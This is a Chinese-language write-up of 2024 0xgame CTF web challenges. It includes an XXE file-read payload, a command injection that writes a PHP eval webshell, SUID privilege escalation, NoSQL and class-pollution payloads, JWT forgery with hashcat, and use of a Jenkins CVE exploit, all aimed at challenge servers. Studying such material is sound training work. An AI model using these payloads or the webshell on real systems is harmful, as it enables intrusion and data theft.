---
title: '2024 0xgame CTF Writeup'
description: '然后进入 console 输入 pin 码即可'
pubDate: 2024-10-20
author: 'IHK-1'
tags: ['CTF', '0xgame', '2024']
---

# baby_pe
<!-- 这是一张图片，ocr 内容为：FLAG要ROOT用户才可以看到,听说FLASK可以算PIN 凸样式编辑器 仪网络 控制台 调试器 查看器 性能 OTHE ENCODING XXE LFI ENCRYPTION SQL XSS LOAD URL HTTP://47.76.151.192:60086/FILEREAD?FILENAME/FLAG SPLIT URL -->


```plain
fileread?filename=/etc/passwd --> root
fileread?filename=%00 --> /usr/local/lib/python3.9/site-packages/flask/app.py
fileread?filename=/sys/class/net/eth0/address --> 02:42:ac:19:00:02
fileread?filename=/etc/machine-id --> 6ee8d0b5126041a1b3ddfefb9ea61b4e
```

然后进入 console 输入 pin 码即可

<!-- 这是一张图片，ocr 内容为：CONSOLE LOCKED THE CONSOLE IS LOCKED AND NEEDS TO BE UNLOCKED BY ENTERING THE PIN.YOU CAN FIND THE PIN PRINTED OUT ON THE STANDARD OUTPUT OF YOUR SHELL THAT RUNS THE SERVER. PIN:124-207-993 CONFIRM PIN 47.76.151.192:60086 ERROR: INCORRECT PIN 确定 -->


与其他 WP 文章计算的 PIN 码相同，但是无法进入

# baby_pickle（×）
# baby_ssrf
```python
from flask import Flask, request
import os
from urllib.parse import urlparse, urlunparse
import subprocess
import socket

app = Flask(__name__)
BlackList = ["127.0.0.1"]

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/cmd', methods=['POST'])
def cmd():
    if request.remote_addr != "127.0.0.1":
        return "Forbidden"
    if request.method == "GET":
        return "Hello World!"
    if request.method == "POST":
        return os.popen(request.form.get("cmd")).read()

@app.route('/visit')
def visit():
    url = request.args.get('url')
    if url is None:
        return "No url provided"
    url = urlparse(url)
    realIpAddress = socket.gethostbyname(url.hostname)
    if url.scheme == "file" or realIpAddress in BlackList:
        return "Hacker!"
    result = subprocess.run(["curl", "-L", urlunparse(url)], capture_output=True, text=True)
    return result.stdout

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

根据源码推测为通过 visit 进行 SSRF 访问  cmd ，进行命令执行

其中 127.0.0.1 可以使用 0.0.0.0 进行绕过，那么现在只需要解决如何进行 POST 发送参数即可

[SSRF基础:Gopher协议发送Get和Post请求_ssrf发post包-CSDN博客](https://blog.csdn.net/weixin_45887311/article/details/107327706)

通过该文章进行修改为 gopher 协议，进行传参 RCE 即可

# baby_xxe
```python
from flask import Flask, request
import base64
from lxml import etree

app = Flask(__name__)

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/parse', methods=['POST'])
def parse():
    xml = request.form.get('xml')
    print(xml)
    if xml is None:
        return "None"
    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
    root = etree.fromstring(xml, parser)
    name = root.find('name').text
    return name or None

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8000)
```

审计源码，传参XML即可

```plain
<?xml version="1.0" ?>
<!DOCTYPE xxe [
    <!ELEMENT name ANY>
    <!ENTITY xxe SYSTEM "file:///flag" >]>
    <root><name>&xxe;</name></root>
```

# hello_include
扫到 index.phps 拿到源码的备份

访问 phpinfo.php 查询到 flag  具体位置，进行文件包含 flag 即可

# hello_shell
无回显直接写入一句话木马即可，空格使用 %09 进行绕过

payload：

```plain
?cmd=echo%09"<?php%09@eval(\$_POST[shell]);?>"%09>%09shell.php
```

进入 shell 后发现需要进行提权

<!-- 这是一张图片，ocr 内容为：中国蚁剑 ANTSWORD 编辑 窗 窗口调试 8 口8.130.84.100 口8.130.84.100 -8.130.84.100 (*)基础信息 当前路径://VAR/WWW/HTML 磁盘列表: 系统信息:LINUX9 6.8.0-31-GENERIC  $31-UBUNTU SMP PREEMPT DINAMIC SAT APR 20 00:40:06 UTC 2024 X36 64 9A0EB94A8153 当前用户:WWW-DATA *)输入ASHELP查看本地命令 (WWW-DATA:/VAR/WWW/HTML)$ CD / (WWW-DATA://) $ WHOAMI WWW-DATA $ SUDO -1 WWW-DATA: /BIN/SH:1:SUDO:NOT FOUND AD /-TYPERM-04000-04000-1S 2>/DEV/NULL $ FIND WWW-DATA:/ 48072 OCT 8 17:01 /VAR/WWW/HTML/WC 526776 48 ROOT -3-3--X 72 71912 JUL 28 2021 /BIN/SU 132402 1 ROOT ROOT -TWSR-XR-X 55528 JUL 28 2021 /BIN/MOUNT 56 132387 1 ROOT ROOT -IWSI-XI-X 35040 JUL 28 36 2021 /BIN/UMOUNT 132408 ROOT ROOT -IWSI-XI-X 63960 FEB 2020 /USR/BIN/PAS3WD 64 7 133009 ROOT ROOT -RWSI-XR-X 132999 44632 FEB 7 2020 /USR/BIN/NEWGRP 1 ROOT ROOT 44 -IWSI-XI-X 132906 2020 58416 FEB 60 /USR/BIN/CHFN 1 ROOT ROOT -IWSI-XI-X 132909 2020 52 52880 FEB /USR/BIN/CHSH 1 ROOT ROOT -RWSR-XI-X 88 132956 2020 /U3R/BIN/GPA33WD 88304 FEB 1 ROOT ROOT -RWSR-XR-X WWW-DATA:/) -->


查看 suid ，发现 /var/www/html/wc 具有 suid 权限，尝试 SUID 文件读取

<!-- 这是一张图片，ocr 内容为：/ WC STAR 10,803 SUDO FILE READ SUID THE FILE CONTENT IS PARSED AS A SEQUENCE OF \X00 SEP SEPARATED PATHS. ON ERROR THE FILE CONTENTENT APPEARS IN A EAD BINARY FILES. MESSAGE, SO THIS MAY NOT BE SUITABLE TO READ FILE READ IT READS DATA FRON FILES, IT MAY BE USED TO DO PRIVILEGED READS OR DISCLOSE FILE SYSTEM. LFILE-FILE TO_READ  WC --FILESO-FROM "$LFILE" -->


<!-- 这是一张图片，ocr 内容为：VAR/WWW/HTML)$ ./WC --FILESO-FROM "/FLAG"  /WC: OXGAME(OBOBBLAA-709D-41CD-9294-E70AB3510151]; NO SUCH ILE OT DLRECTORY -->


# picture
文件头判断以及文件后缀黑名单绕过

<!-- 这是一张图片，ocr 内容为：BURP SUITE专业饭 V202421 - B时项目 -FCENSED TO LEON406 查干 静助 学习 O找索价设置 半日 扩展 王欣茶 COLLABORATOR ORGANIZER 质量工具 HTTP/1  目标:HTTP://8.130.84.100:50003 发送 川 @X 请求 啊肉 SE 页面追染 语求起性 美化 美化 HTTP/1.1 200 POST/UPLOAD.PBO BTTP/1.1 2 DATE: BON,28 00T 2024 14:20:53 GHT HOWT:0.130.04.100:50003 请求查询参数 S(DRAGEDED: SO2ILLIA/S.D (GLNDOWS JIT 10.0) U1064) X641 X641 2V:131.0) GEOKO/01010101 FF26FOX/131.0 3 SERVER:APACHE/2.4.51 X-POWECED-BY:PHP/7.4.27 4ACCEPT: 请求主体参致 TEXE/WIGE/APPLLCALLEALLYBTEL+ZZI,APPLICASION/XWLIQ-D.G,IMAGE/WAGE/WVIL,LMAQE/WEBP,LEAGE/SOG,SMARYE/SY CONCENE-LENGTH: 59 园 S(ACQEPE-L,33QUAGE: 三部-CH,G-O.D.D.G.亚加一丁都;Q-0.7,证A一回.5.6.5.6.5.051Q-0.3.62/Q-0. E:TEXT/ATML:CHAZSET-07F-0 CONTENE-TYPE:T 请求COOKLES HTTPSPR-HYPAINGINGEDTOLM-DATM-DAT 9  ROOMOOWPLOADS/671R9DOSO5E TO-1. PHTML --30471404376114924790024385090 THTST.HETS HEB//E:330.OS,LOO SOO.SOO.SOO.S 12 请求头 O CONAECTION:CLOSE 6 响应头 PETERER:ATEP://0.130.04.100:50003/ UPGRADE-TASECUCE-REQUESTS:1 6 CONTENT-DISPOSITIOA: FORM-DATA; NAMEUFILE": TLLENAME,"L,PHUML CONTENT-TYPE:IMAGE/JPEG LOGBU GOYAJFIFYUC YUC GA "YA GAULIAOA"Q200.WB2APS653BRD 25 YX 259XLW!1AQAQAQAQ+士A N32602& 26 546438 LET LETEDD:D17.1-EDGEEGESX85071700433004L+A+20001+A+200 ICDOVFICELO(YU <7PLY BEVAL(S POSTEABELLLI/2> 19 COBTENT-DISPOSLTLON: FORM-DAR3EA71404376111193 2792034395090 A,OAH 0高亮 为什么你的文件名里面有PHP呢? 搜索 0高亮 252字节43MLLLLS 完成 -->


<!-- 这是一张图片，ocr 内容为：中国蚁剑 X ANTSWORD编辑窗口调试 8.130.84.100 编辑:/FLAG 用此编码打开 三高亮 刷新 B保存 /FLAG 0XGAME{FAB7EB4B-7CBA-49F9-B45C-29223BE0A089] -->


# Next.db 复现
```plain
{"name":{"$ne":1}}
```

该字符串表示查询所有非 1 的数字，所以绕过了 flag

# WhySoSerial（×）
# cargo_shop
审计代码，推测为购买 flag ，但是 flag 加个为1_000_000_000

由于购买与售出函数有符号型与无符号型变换，现在要做的是让加个变为负数，进行溢出

i32 max 为 2147483647 ，发现成功溢出了

<!-- 这是一张图片，ocr 内容为：OX CARGOSHOP.CHALLENGE.EXP10IT.IO CARGOSHOP.CHALLENGE.EXP10IT.IO/PURCHASE/ACTIX-WEB/2147483647 ABOUTBLANK PURCHASE ACTIX-WEB X 2147483647 S 7 SUCCESS 竹网络 调试器 口查看器 日存储 甘无障碍环境 样式编辑器 应用程序 内存 控制台 性能 LFI V XSS XXE ENCRYPTION SQL OTHER ENCODING LOAD URL HTTP://CARGOSHOP.CHALLENGE.EXP10IT.IO/PURCHASE/ACTIX-WEB/2147483647 SPLIT URL EXECUTE CLEAR ALL USER AGENT POST DATA COOKIES REFERER ADD"I -->


直接购买 flag * 2147483647 使其溢出为 负数 -1_000_000_000

<!-- 这是一张图片，ocr 内容为：CARGOSHOP.CHALLENGE.EXP10IT.I CARGOSHOP.CHALLENGE.EXP10IT.IO/PURCHASE/FLAG/2147483647 ABOUT:BLANK PURCHASE FLAG X 2147483647 SUCCESS 刀样式编辑器 竹网络 应用程 性能非内存储日存储碍环境 口调试器 口查看器 控制台 LFI XSS ENCRYPTION OTHER XXE SQL ENCODING LOAD URL HTTP://CARGOSHOP.CHALLENGE.EXP10IT.IO/PURCHASE/FIAG/2147483647 SPLIT URL EXECUTE CLEAR ALL COOKIES USER AGENT POST DATA REFERER ADD'? -->


成功购买，访问 /flag 获得 flag

# hello_jwt 
hint1 未开启验证，所以直接伪造 role 为 Please, give me the hint 即可

<!-- 这是一张图片，ocr 内容为：DECODED ENCODED PASTE A TOKEN HERE EDIT THE PAYLOAD AND SECRET HEADER:ALGORITHM&TOKEN TYPE EYJHBGCIOIJIUZI1NIISINR5CCI6IKPXVCJ9.EY "ALG":"HS256", J1C2VYBMFTZSI6IMFKBWLUIIWICM9SZSI6I1BSZ TYP":"JWT" WFZZSWGZ212ZSBTZSBOAGUGAGLUDCJ9.Q1KDFEH 09R-WMDC2F4F8QQBXK8GSPB72YHY_NZTQKX8 PAYLOAD: DATA "USERNAME": "ADMIN", "ROLE": "PLEASE, GIVE ME THE HINT" VERIFY SIGNATURE HMACSHA256 BASE64URLENCODE(HEADER) BASE64URLENCODE(PAYLOAD), ) SECRET BASE64 ENCODED -->


<!-- 这是一张图片，ocr 内容为：我听说KEY的长度不大 -->


hint2 因为 temp_key 是明文，直接使用 key 伪造 role 即可

<!-- 这是一张图片，ocr 内容为：HEADER: ALGORITHM& TOKENTYPE EYJHBGCIOIJIUZI1NIISINR5CCI6IKPXVCJ9.EY "ALG":"HS256" J1C2VYBMFTZSI6IMFKBWLUIIWICM9SZSI6IKJ1D TYP"JWT" CWGSSBJYW4GC2V1IHROZSB0ZW1WB3JHCNKGA2V5 IN0.7SG7Z-EB- WSERTSJCEZNXJYX2PKNWTPLRB4JKU2W7C0 PAYLOAD:DATA "ROLE": "BUT, I CAN SEE THE TEMPORARY KEY" VERIFY SIGNATURE HMACSHA256(  BASE64URLENCODE(HEADER) + "." +  BASE64URLENCODE(PAYLOAD), VERY VERY LONG AND INE T BASE64 ENCODED OSECRETB SIGNATURE VERIFIED SHARE JWT -->


<!-- 这是一张图片，ocr 内容为：我看见KEY只有小写字母 -->


那么只需要使用 hashcat 进行爆破即可

<!-- 这是一张图片，ocr 内容为：FILE ACTIONS EDIT VIEW HELP 0/1 (0.00%) DIGESTS (TOTAL), 0/1(0.00%) DIGESTS (NEW) RECOVERED. 456976/456976(100.00%)6WACOM...USBKEYBOA. PROGRESS USBMICEDA... 0/456976(0.00%) REJECTED.. 17576/17576(100.00%) RESTORE.POINT. SALT:0 AMPLIFIER:0-26 ITERATION:0-26 RESTORE.SUB.#1. CANDIDATE.ENGINE.: DEVICE GENERATOR CANDIDATES.#1.. SPNGXQXV HARDWARE.MON.#1...UTIL:81% UPDATE.SH LIB MYSQLU... C-IWT-CRACK... ANTSWORD-L... BKCRACK-1.5. HACK.SO LOWER THAN EXPECTED?  CRACKING PERFORMANCE LOW APPEND -W 3 TO THE COMMANDLINE. THIS CAN CAUSE YOUR SCREEN TO LAG. S APPEND -S TO THE COMMANDLINE. THIS HAS A DRASTIC SPEED IMPACT BUT CAN BE BETTER FOR SPECIFIC ATTACKS. TYPICAL SCENARIOS ARE A SMALL WORDLIST BUT A LARGE RULESET. - UPDATE YOUR BACKEND API RUNTIME / DRIVER THE RIGHT WAY: HTTPS://HASHCAT.NET/FAQ/WRONGDRIVER CREATE MORE WORK ITEMS TO MAKE USE OF YOUR PARALLELIZATION POWER: HTTPS://HASHCAT.NET/FAQ/MOREWORK LINUX SESSION. HASHCAT STATUS.. CRACKED 16500 (JWT (JSON WEB TOKEN)) HASH.MODE. EYJHBGCIOIJIUZIINIISINR5CCI6IKPXVC39.EYJ1C2VYBMFTZS....A-PDKA HASH.TARGET. MON OCT 28 11:12:59 2024 (16 SECS) TIME.STARTED. MON OCT 28 11:13:15 2024 (0 SECS) TIME.ESTIMATED QUIETER YOU BECOME, THE MORE YOU ARE ABLE TO HEAR" KERNEL.FEATURE PURE KERNEL THE Q ?1?1?1?1?1[5] GUESS.MASK... 5/6(83.33%) GUESS.QUEUE. 675.5 KH/S (9.63MS)@ ACCEL:64 LOOPS:26 THR:1 VEC:8 SPEED.#1. 1/1 (100.00%) DIGESTS (TOTAL), 1/1 (100.00%) DIGESTS (NEW) RECOVERED. 10915840/11881376 (91.87%) PROGRESS 0/10915840(0.00%) REJECTED. 419584/456976 (91.82%) RESTORE.POINT.. SALT:0 AMPLIFIER:0-26 ITERATION:0-26 RESTORE.SUB.#1. CANDIDATE.ENGINE.: DEVICE GENERATOR CANDIDATES.#1....: SFPWZ > XBAJZ HARDWARE.MON.#1...UTIL:64% STARTED: MON 0CT 28 11:12:18 2024 STOPPED: MON OCT 28 11:13:16 2024 -->


<!-- 这是一张图片，ocr 内容为：8.130.84.100:50006/FLAG 8.130.84.100:50006/FLAG ABOUT:BLANK OXGAME{883FA114-EBF3-4EA9-B8CD-366F3BA846E7} -->


# Jekins
<!-- 这是一张图片，ocr 内容为：REST API JENKINS 2.441 -->


搜索对应版本 Jenkins ，有个 CVE CVE-2024-23897，直接找 EXP 打即可

<!-- 这是一张图片，ocr 内容为：WINDOWS POWERSHELL [INF] GOLANG POC引擎启动 [INF] DONE! -U HTTP://8.130.84.100:8080/ -D /FLAG UPS C:\USERS\HK\DESKTOP\WEB\攻击> C:\USERS\HK\DESKTOP\CVE-2024-23897.EXE -UL FLAG PROVIDED BUT NOT DEFINED:-D IPS C:\USERS)HA DESHTOPLWEB)改击> C:VUSERSYNA DESINTOP(CVE-2024-23997, EXE -U HTEP://8,130.3H,19080/ /F CVE 2024-23697 JENKINS任意文件读取漏洞 WJLINO.COM 慎用.你要为自己的行为负责 开发者不承担任何责任,也不对任何误用或损坏负责. CURRENT CVE-2024-23897 VERSION V1.0.1 (OUTDATED) INFJ CINF] RUNNING READ FILE MODE [INF] L ] LOADED 1 TARQETS FROM INPUT [CVE-2024-23897] HTTP://8.130.84.100:8080 MODE:READ FILE MODE COMMAND:WHO-AM-I FILENAME://FLAG 0XGAME{2A6D2B88-7D12-4B66-901D-5ED489E9A3223 [INF] TOOK 3.28 SECONDS WITH 1 SUCCESSFUL TAM L TARGETS PS C:\USERS\HK\DESKTOP\WEB\攻击> -->


# basic_flask
```python
from flask import Flask, request
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and isinstance(v, dict):
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and isinstance(v, dict):
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Dst():
    def __init__(self):
        pass

dst = Dst()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'GET':
        return open("main.py").read()
    merge(request.get_json(), dst)
    return "Success"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8000)
```

审计代码，发现是 python 原型链污染，需要污染 static 到根目录，进行访问 文件即可

```plain
{"__init__":{"__globals__":{"app":{"_static_folder":"/"}}}}
```

<!-- 这是一张图片，ocr 内容为：请求 响应 页面渲染 美化 HEX 美化 RAW RAW HEX HTTP/1.1 200  OK POST / HTTP/1.1 SERVER:VERKZEUG/3.0.6 PYTHON/3.9.20 HOST:47.76.152.109:60090 3 US ILUGER-AGENT: HOZILLA/5.0) (WINDOUS NT 10.0; D1NE4; X64: 3V:131.0) GEEKO/20100100101 F1131.91.9 DATE: TUE,29 OCT 2024 14:56:18 GHT 44 CONTENT-TYPE: TEXT/HTML; CHARSET-UTI-8 ACCEPT: 15678 CONTENT-LENGTH:7 TEXT/HTML,APPLICATION/ZHTML+ZML,    PPLICALICALIGE/SML:G,IMAGE/AVIT,IMAGE/ YEBP, IMAGE/PAGE/ CONNECTION:CLOSE G+XM1,*/*:Q-0.8 LACCEPT-LANGUAGE:ZH-CN,ZHIQE0.8,2H-TU;Q:0.7,ZH-HKIGEO.5,EN-USIQEO.3,ENIGE0.2 SUCCESS ACCEPT-ENCODING:GZIP,DEFLATE,BR CONTENT-TYPE:APPLICAT ION/JSON CONTENT-LENGTH:59 ORIGIN:HTTP://47.76.152.109:60090 CONNECTION:CLOSE REFERER:HTTP://47.76.152.109:60090 12 UPGRADE-INSECURE-REQUESTS: 1 13P PRIORITY:U-0,I 14 15 INIT                       * *: 地:( GLOBALS "APP" : _STATIC_TOLDER":"/" -->


访问 /static/flag 拿到 flag

# basic_pwn（×）
```python
from flask import Flask, request

app = Flask(__name__)

functions = globals()['__builtins__'].__dict__

@app.route('/', methods=['GET'])
def index():
    return open(__file__).read()

@app.route('/pwn', methods=['POST'])
def pwn():
    stack = []
    stack.append('print')
    name = request.get_json().get("name")
    if not name:
        return "Fail"
    stack.extend(name)
    args = stack.pop()
    func = stack.pop()
    functions[func](args)
    return "Success"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

# rogue_mysql（×）
